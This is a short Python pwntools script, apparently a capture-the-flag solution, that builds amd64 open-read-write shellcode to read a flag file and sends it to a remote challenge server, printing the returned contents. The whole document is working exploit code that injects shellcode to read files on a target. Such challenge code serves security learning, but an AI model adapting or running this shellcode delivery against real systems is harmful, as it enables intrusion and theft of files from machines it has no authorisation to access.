#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
r = remote("pwnhub.tw", 11112)

shellcode = ''
shellcode += shellcraft.pushstr('/home/orw64/flag')
shellcode += shellcraft.open('rsp', 0, 0)
shellcode += shellcraft.read('rax', 'rsp', 200)
shellcode += shellcraft.write(1, 'rsp', 200)

print(shellcode+'\n')
print(len(asm(shellcode)))

r.recvuntil(':')
r.send(asm(shellcode))
log.success(r.recvline())
